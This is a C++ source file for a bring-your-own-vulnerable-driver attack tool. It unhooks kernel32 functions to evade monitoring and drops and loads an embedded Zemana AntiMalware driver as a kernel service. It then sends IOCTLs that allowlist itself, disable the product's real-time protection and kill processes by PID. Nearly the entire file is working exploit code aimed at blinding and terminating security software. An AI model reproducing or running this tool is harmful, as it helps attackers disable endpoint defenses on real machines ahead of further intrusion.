#include <iostream>
#include <winternl.h>
#include <windows.h>

#include <string>
#include "main.h"
#include <cstdio>
#include <iostream>
#include <memory>
#include <stdexcept>
#include <string>
#include <array>
#include <fstream>
#include <locale>
#include <codecvt>

HMODULE myGetModuleHandle(PWSTR search) {

// obtaining the offset of PPEB from the beginning of TEB
    PEB* pPeb = (PEB*)__readgsqword(0x60);

// for x86
// PEB* pPeb = (PEB*)__readgsqword(0x30);

// Get PEB
    PEB_LDR_DATA* Ldr = pPeb->Ldr;
    LIST_ENTRY* ModuleList = &Ldr->InMemoryOrderModuleList;

// Start iterating
    LIST_ENTRY* pStartListEntry = ModuleList->Flink;

// iterating through the linked list.
    WCHAR mystr[MAX_PATH] = { 0 };
    WCHAR substr[MAX_PATH] = { 0 };
    for (LIST_ENTRY* pListEntry = pStartListEntry; pListEntry != ModuleList; pListEntry = pListEntry->Flink) {

// getting the address of current LDR_DATA_TABLE_ENTRY (which represents the DLL).
        LDR_DATA_TABLE_ENTRY* pEntry = (LDR_DATA_TABLE_ENTRY*)((BYTE*)pListEntry - sizeof(LIST_ENTRY));
//printf("%S : %p\n",pEntry->FullDllName.Buffer,(HMODULE)pEntry->DllBase);

        if(!wcscmp(pEntry->FullDllName.Buffer,search)){
            return (HMODULE)pEntry->DllBase;
        }
    }

// the needed DLL wasn't found
    return NULL;
}

std::wstring GetFullTempPath() {
    wchar_t temp_directory[MAX_PATH + 1] = { 0 };
    const uint32_t get_temp_path_ret = GetTempPathW(sizeof(temp_directory) / 2, temp_directory);
    if (!get_temp_path_ret || get_temp_path_ret > MAX_PATH + 1) {
        printf("[-] Failed to get temp path\n");
        return L"";
    }
    if (temp_directory[wcslen(temp_directory) - 1] == L'\\')
        temp_directory[wcslen(temp_directory) - 1] = 0x0;

    return temp_directory;
}

char zemina[7]="zemina";
const std::wstring driver_name=L"zemina";
const std::wstring servicesPath = L"SYSTEM\\CurrentControlSet\\Services\\" + driver_name;
std::wstring wdriver_reg_path = L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\" + driver_name;
std::wstring nPath;
HMODULE ntdll;

typedef NTSTATUS(*myNtLoadDriver)(PUNICODE_STRING DriverServiceName);
typedef NTSTATUS(*myNtUnloadDriver)(PUNICODE_STRING DriverServiceName);
typedef NTSTATUS(*myRtlAdjustPrivilege)(_In_ ULONG Privilege, _In_ BOOLEAN Enable, _In_ BOOLEAN Client, _Out_ PBOOLEAN WasEnabled);
typedef VOID(*myRtlInitUnicodeString)(_Out_ PUNICODE_STRING DestinationString, _In_ __drv_aliasesMem PCWSTR SourceString);
UNICODE_STRING serviceStr;

int hookChecker(const wchar_t* libPath, const wchar_t* lib, const char* funToCheck) {

    HANDLE dllFile = CreateFileW(libPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    DWORD dllFileSize = GetFileSize(dllFile, NULL);
    HANDLE hDllFileMapping = CreateFileMappingW(dllFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    HANDLE pDllFileMappingBase = MapViewOfFile(hDllFileMapping, FILE_MAP_READ, 0, 0, 0);
    CloseHandle(dllFile);

// analyze the dll
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pDllFileMappingBase;
    PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)((PBYTE)pDllFileMappingBase + pDosHeader->e_lfanew);
    PIMAGE_OPTIONAL_HEADER pOptionalHeader = (PIMAGE_OPTIONAL_HEADER) & (pNtHeader->OptionalHeader);
    PIMAGE_EXPORT_DIRECTORY pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pDllFileMappingBase + pOptionalHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    PULONG pAddressOfFunctions = (PULONG)((PBYTE)pDllFileMappingBase + pExportDirectory->AddressOfFunctions);
    PULONG pAddressOfNames = (PULONG)((PBYTE)pDllFileMappingBase + pExportDirectory->AddressOfNames);
    PUSHORT pAddressOfNameOrdinals = (PUSHORT)((PBYTE)pDllFileMappingBase + pExportDirectory->AddressOfNameOrdinals);

// find the original function code
    PVOID functionFromDisk = NULL;
    for (int i = 0; i < pExportDirectory->NumberOfNames; ++i)
    {
        PCSTR pFunctionName = (PSTR)((PBYTE)pDllFileMappingBase + pAddressOfNames[i]);
        if (!strcmp(pFunctionName, funToCheck))
        {
            functionFromDisk = (PVOID)((PBYTE)pDllFileMappingBase + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
            break;
        }
    }
// compare functions
    PVOID functionFromMemory = (PVOID)GetProcAddress(GetModuleHandleW(lib), funToCheck);
    if (!memcmp(functionFromMemory, functionFromDisk, 16))
    {
        printf("%s was not hooked\n",funToCheck);
        return 0;
    }

    printf("fixing hook on %s\n",funToCheck);
    DWORD old_protection;
    VirtualProtect(functionFromMemory, 16, PAGE_EXECUTE_READWRITE,  &old_protection);
    memcpy(functionFromMemory,functionFromDisk,16);
    VirtualProtect(functionFromMemory, 16, old_protection,  &old_protection);
    return 1;

}

void testHook(const wchar_t* lib, const char* fun) {
    PVOID pMessageBoxW = (PVOID)GetProcAddress(GetModuleHandleW(lib), fun);
    DWORD oldProtect;
    VirtualProtect(pMessageBoxW, 1, PAGE_EXECUTE_READWRITE, &oldProtect);
    char hook[] = { static_cast<char>(0xC3) }; // ret
    memcpy(pMessageBoxW, hook, 1);
    VirtualProtect(pMessageBoxW, 1, oldProtect, &oldProtect);
    MessageBoxW(NULL, L"Hooked", L"Hooked", 0); // won't show up if you hooked it

}

#define ZMN_IOCTL_TYPE 0x8000
#define ZMN_IOCTL_TERMINATE_PROCESS CTL_CODE(ZMN_IOCTL_TYPE, 0x812, METHOD_BUFFERED, FILE_ANY_ACCESS) // 0x80002048


bool terminate_process(HANDLE device_handle,uint32_t process_id)
{
    DWORD buffer = process_id;
    DWORD bytes_returned = 0;
    return DeviceIoControl(device_handle, ZMN_IOCTL_TERMINATE_PROCESS, &buffer, sizeof(buffer), &buffer, sizeof(buffer), &bytes_returned, NULL);
}


typedef void * (__stdcall *myDeviceIoControl)(HANDLE,DWORD,LPVOID,DWORD,LPVOID,DWORD,LPDWORD,LPOVERLAPPED);

BOOL LoadNTDriver()
{

    std::wstring string_to_convert=L"\\??\\"+GetFullTempPath()+L"\\zemina.sys";
//setup converter
    using convert_type = std::codecvt_utf8<wchar_t>;
    std::wstring_convert<convert_type, wchar_t> converter;
//use converter (.to_bytes: wstr->str, .from_bytes: str->wstr)
    std::string converted_str = converter.to_bytes( string_to_convert );
    BOOL bRet = FALSE;

    SC_HANDLE hServiceMgr = NULL;
    SC_HANDLE hServiceDDK = NULL;

    hServiceMgr = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);

    if (hServiceMgr == NULL)
    {

        printf("OpenSCManager() Faild %d ! \n", GetLastError());
        bRet = FALSE;
        goto BeforeExit;
    }
    else
    {
        printf("OpenSCManager() ok ! \n");
    }



    hServiceDDK = CreateService(hServiceMgr,
                                zemina,
                                zemina,
                                SERVICE_ALL_ACCESS,
                                SERVICE_KERNEL_DRIVER,
                                SERVICE_DEMAND_START,
                                SERVICE_ERROR_IGNORE,
                                converted_str.c_str(),
                                NULL,
                                NULL,
                                NULL,
                                NULL,
                                NULL);

    DWORD dwRtn;
    if (hServiceDDK == NULL)
    {
        dwRtn = GetLastError();
        if (dwRtn != ERROR_IO_PENDING && dwRtn != ERROR_SERVICE_EXISTS)
        {
            printf("CrateService() Faild %d ! \n", dwRtn);
            bRet = FALSE;
            goto BeforeExit;
        }
        else
        {
            printf("CrateService() Faild Service is ERROR_IO_PENDING or ERROR_SERVICE_EXISTS! \n");
        }

        hServiceDDK = OpenService(hServiceMgr, zemina, SERVICE_ALL_ACCESS);
        if (hServiceDDK == NULL)
        {
            dwRtn = GetLastError();
            printf("OpenService() Faild %d ! \n", dwRtn);
            bRet = FALSE;
            goto BeforeExit;
        }
        else
        {
            printf("OpenService() ok ! \n");
        }
    }
    else
    {
        printf("CrateService() ok ! \n");
    }

    bRet = StartService(hServiceDDK, NULL, NULL);
    if (!bRet)
    {
        DWORD dwRtn = GetLastError();
        if (dwRtn != ERROR_IO_PENDING && dwRtn != ERROR_SERVICE_ALREADY_RUNNING)
        {
            printf("StartService() Faild %d ! \n", dwRtn);
            bRet = FALSE;
            goto BeforeExit;
        }
        else
        {
            if (dwRtn == ERROR_IO_PENDING)
            {
                printf("StartService() Faild ERROR_IO_PENDING ! \n");
                bRet = FALSE;
                goto BeforeExit;
            }
            else
            {
                printf("StartService() Faild ERROR_SERVICE_ALREADY_RUNNING ! \n");
                bRet = TRUE;
                goto BeforeExit;
            }
        }
    }
    bRet = TRUE;
    DWORD ssp;
    BeforeExit:
    if (hServiceDDK)
    {
        /*if(!ControlServiceEx(hServiceDDK,
                         SERVICE_CONTROL_STOP,
                         ssp,
                         NULL))
        {
            dwRtn = GetLastError();
            printf("StopService() Faild %d ! \n", dwRtn);
        }*/


        CloseServiceHandle(hServiceDDK);
    }
    if (hServiceMgr)
    {
        CloseServiceHandle(hServiceMgr);
    }
    return bRet;
}
/*
bool StopAndRemove() {


    HKEY driver_service;
    LSTATUS status = RegOpenKeyW(HKEY_LOCAL_MACHINE, servicesPath.c_str(), &driver_service);
    if (status != ERROR_SUCCESS) {
        if (status == ERROR_FILE_NOT_FOUND) {
            return true;
        }
        return false;
    }
    RegCloseKey(driver_service);


    auto customNtUnloadDriver = (myNtUnloadDriver) GetProcAddress(ntdll, "NtUnloadDriver");

    NTSTATUS st = customNtUnloadDriver(&serviceStr);

    printf("[+] NtUnloadDriver Status 0x\n");


    printf("Driver unloaded\n");

    //setup converter
    using convert_type = std::codecvt_utf8<wchar_t>;
    std::wstring_convert<convert_type, wchar_t> converter;
//use converter (.to_bytes: wstr->str, .from_bytes: str->wstr)
    std::string converted_str = converter.to_bytes( nPath );

    std::ofstream wf(converted_str, std::ios::out | std::ios::binary);

    DeleteFile(reinterpret_cast<LPCSTR>(nPath[5]));
    status = RegDeleteTreeW(HKEY_LOCAL_MACHINE, servicesPath.c_str());
    if (status != ERROR_SUCCESS) {
        return false;
    }
    return true;
}*/

int MyMarkServiceForDeletion(char *szServiceName)
{
    // Attention: If we would completely delete the service registry key of the driver,
    // we can not install the driver anymore and have to reboot! By using the INF install
    // method, the driver is copied to "C:\Windows\system32\drivers\DBUtilDrv2.sys". The
    // function "SetupDiRemoveDevice" does not delete the driver on both Windows 7 and
    // Windows 10. It also does not remove the service entry on Windows 7. Only on Windows
    // 10 the service entry is removed by setting the DWORD "DeleteFlag" to 0x00000001.
    // After the next reboot this will delete the service registry entry. To do a clean
    // uninstall on Windows 7, we do the same as the system does on Windows 10 and the
    // service is deleted on the next reboot. The driver files have to be deleted on
    // both operating systems by DSE-Patcher.

    // create registry service key of driver
    char szSubKey[MAX_PATH];
    lstrcpy(szSubKey,"SYSTEM\\CurrentControlSet\\services\\");
    lstrcat(szSubKey,szServiceName);

    // open registry key
    HKEY hKey;
    if(RegOpenKeyEx(HKEY_LOCAL_MACHINE,szSubKey,0,KEY_ALL_ACCESS,&hKey) != ERROR_SUCCESS)
    {
        return 1;
    }

    // create "DeleteFlag" with the DWORD value 0x00000001
    DWORD dwDeleteFlag = 0x00000001;
    //lint -e{747} Warning 747: Significant prototype coercion (arg. no. 6) unsigned long long to unsigned long
    if(RegSetValueEx(hKey,"DeleteFlag",0,REG_DWORD,(BYTE*)&dwDeleteFlag,sizeof(DWORD)) != ERROR_SUCCESS)
    {
        RegCloseKey(hKey);
        return 2;
    }

    // close registry key handle
    RegCloseKey(hKey);

    return 0;
}




int MyStopAndDeleteService()
{
    int rc = 0;
    SC_HANDLE schSCManager = NULL;
    SC_HANDLE schService = NULL;

    // get handle to SCM database
    //lint -e{838} Warning 838: Previously assigned value to variable has not been used
    schSCManager = OpenSCManager(NULL,NULL,SC_MANAGER_ALL_ACCESS);
    if(schSCManager == NULL)
    {
        rc = 1;
        goto cleanup;
    }

    // get handle to service
    schService = OpenService(schSCManager,zemina,SERVICE_ALL_ACCESS);
    if(schService == NULL)
    {
        // service is not installed
        rc = 0;
        goto cleanup;
    }

    // if we get here the service is already installed, we have to stop and delete it

    // query service status
    SERVICE_STATUS_PROCESS ssp;
    DWORD dwBytesNeeded;
    //lint -e{747} Warning 747: Significant prototype coercion (arg. no. 4) unsigned long long to unsigned long
    if(QueryServiceStatusEx(schService,SC_STATUS_PROCESS_INFO,(LPBYTE)&ssp,sizeof(SERVICE_STATUS_PROCESS),&dwBytesNeeded) == FALSE)
    {
        rc = 2;
        goto cleanup;
    }

    // service is not stopped already and the service can be stopped at all
    if(ssp.dwCurrentState != SERVICE_STOPPED && ssp.dwControlsAccepted & SERVICE_ACCEPT_STOP)
    {
        // service stop is pending
        if(ssp.dwCurrentState == SERVICE_STOP_PENDING)
        {
            // do this as long as the service stop is pending
            // try 10 times and wait one second in between attempts
            for(unsigned int i = 0; i < 10; i++)
            {
                // query service status
                //lint -e{747} Warning 747: Significant prototype coercion (arg. no. 4) unsigned long long to unsigned long
                if(QueryServiceStatusEx(schService,SC_STATUS_PROCESS_INFO,(LPBYTE)&ssp,sizeof(SERVICE_STATUS_PROCESS),&dwBytesNeeded) == FALSE)
                {
                    rc = 3;
                    goto cleanup;
                }

                // check if service is stopped
                if(ssp.dwCurrentState == SERVICE_STOPPED)
                {
                    // leave for loop
                    break;
                }

                // wait one seconds before the next try
                Sleep(1000);
            }
        }

        // stop service
        if(ControlService(schService,SERVICE_CONTROL_STOP,(LPSERVICE_STATUS)&ssp) == FALSE)
        {
            rc = 4;
            goto cleanup;
        }

        // do this as long as the service is not stopped
        // try 10 times and wait one second in between attempts
        for(unsigned int i = 0; i < 10; i++)
        {
            // query service status
            //lint -e{747} Warning 747: Significant prototype coercion (arg. no. 4) unsigned long long to unsigned long
            if(QueryServiceStatusEx(schService,SC_STATUS_PROCESS_INFO,(LPBYTE)&ssp,sizeof(SERVICE_STATUS_PROCESS),&dwBytesNeeded) == FALSE)
            {
                rc = 5;
                goto cleanup;
            }

            // check if service is stopped
            if(ssp.dwCurrentState == SERVICE_STOPPED)
            {
                // leave for loop
                break;
            }

            // wait one seconds before the next try
            Sleep(1000);
        }
    }

    // We do not check for the 10 second timeout of the for loops above. If the service is not stoppable or
    // does not stop, because some other handle is open, we should make sure to mark it for deletion. This
    // way it is deleted on the next system startup.

    cleanup:
    if(schService != NULL)
    {
        // delete service
        DeleteService(schService);
        // close service handle
        CloseServiceHandle(schService);
    }

    // close service manager handle
    if(schSCManager != NULL) CloseServiceHandle(schSCManager);

    // mark registry service key for deletion
    // we do not check the return value, because it may be no service entry present at startup
    //lint -e{534} Warning 534: Ignoring return value of function
    //lint -e{1773} Warning 1773: Attempt to cast away const (or volatile)
    MyMarkServiceForDeletion(zemina);

    // delete vulnerable driver
    // we do not check the return value, because it may be no driver file present at startup

    return rc;
}


int main(int argc, char** argv) {

    printf("\nChecking hooks\n");
    hookChecker(L"C:\\Windows\\System32\\kernel32.dll", L"kernel32.dll", "CreateFileA");
    hookChecker(L"C:\\Windows\\System32\\kernel32.dll", L"kernel32.dll", "CreateFileW");
    hookChecker(L"C:\\Windows\\System32\\kernel32.dll", L"kernel32.dll", "DeviceIoControl");



    ntdll = GetModuleHandleA("ntdll.dll");
    if (ntdll == NULL) {
        return false;
    }
    std::wstring string_to_convert=GetFullTempPath()+L"\\zemina.sys";

//setup converter. just for more complicated asm
    using convert_type = std::codecvt_utf8<wchar_t>;
    std::wstring_convert<convert_type, wchar_t> converter;
//use converter (.to_bytes: wstr->str, .from_bytes: str->wstr)

    std::string converted_str = converter.to_bytes( string_to_convert );
    std::ofstream wf(converted_str, std::ios::out | std::ios::binary);
    wf.write(driver, 203680);
    wf.close();

    auto customRtlAdjustPrivilege = (myRtlAdjustPrivilege)GetProcAddress(ntdll, "RtlAdjustPrivilege");
    ULONG SE_LOAD_DRIVER_PRIVILEGE = 10UL;
    BOOLEAN SeLoadDriverWasEnabled;
    NTSTATUS Status = customRtlAdjustPrivilege(SE_LOAD_DRIVER_PRIVILEGE, TRUE, FALSE, &SeLoadDriverWasEnabled);
    if (!NT_SUCCESS(Status)) {
        printf("Fatal error: failed to acquire SE_LOAD_DRIVER_PRIVILEGE. Make sure you are running as administrator.\n");
        return 1;
    }
    LoadNTDriver();

    printf("\nStarting device control\n");
    myDeviceIoControl dynamicIoControl = (myDeviceIoControl) GetProcAddress((HINSTANCE) LoadLibrary("kernel32.dll"),
                                                                            "DeviceIoControl");
    HANDLE hDevice = 0;
    int exploit_pid = 0;
    bool success = 0, disable_zam = 0, disable_rt = 0;
    static void *address;

    printf("[!] Retrieving zam64 handle [!]\n");
    hDevice = CreateFile("\\\\.\\ZemanaAntiMalware", GENERIC_READ | GENERIC_WRITE, NULL, NULL, OPEN_EXISTING,
                         FILE_ATTRIBUTE_NORMAL, NULL);
    if (!hDevice) {
        printf("[X] Error : %lu [X]",GetLastError());
        return -1;
    }
    printf("[!] Zemana AntiMalware HANDLE: 0x%lu [!]\n",hDevice);

    printf("[!] Adding process to the allowlist [!]\n");
    exploit_pid = GetCurrentProcessId();
    if (!exploit_pid) {
        printf("[X] Error code: %lu",GetLastError());
        return -1;
    }


    success = dynamicIoControl(hDevice, 0x80002010, &exploit_pid, sizeof(exploit_pid), NULL, 0, NULL, NULL);
    if (!success) {
        printf("[X] Failed to add exploit's process to the allowlist. Error code: %lu",GetLastError());
        return -1;
    }

    printf("[!] Disabling ZAM Guard and Real-Time Protection [!]\n");
    disable_zam = DeviceIoControl(hDevice, 0x80002064, NULL, sizeof(exploit_pid), NULL, 0, NULL, NULL);
    disable_rt = DeviceIoControl(hDevice, 0x80002090, NULL, sizeof(exploit_pid), NULL, 0, NULL, NULL);
    if (!disable_zam || !disable_rt) {
        printf("[!] Failed to disable ZAM Guard or Real-Time Protection [!]");
    }

    printf("[!] Terminating processes [!]\n");


    for(int i=1;i<argc;i++)
    {
        int pid = atoi(argv[i]);
        if (!terminate_process(hDevice, pid)) {
            printf("[X] Unable to terminate\n [X]");
        }
        else
            printf("[O] %d terminated\n [O]",pid);

    }

    printf("[O] Have fun [O]");

    //MyStopAndDeleteService();


}
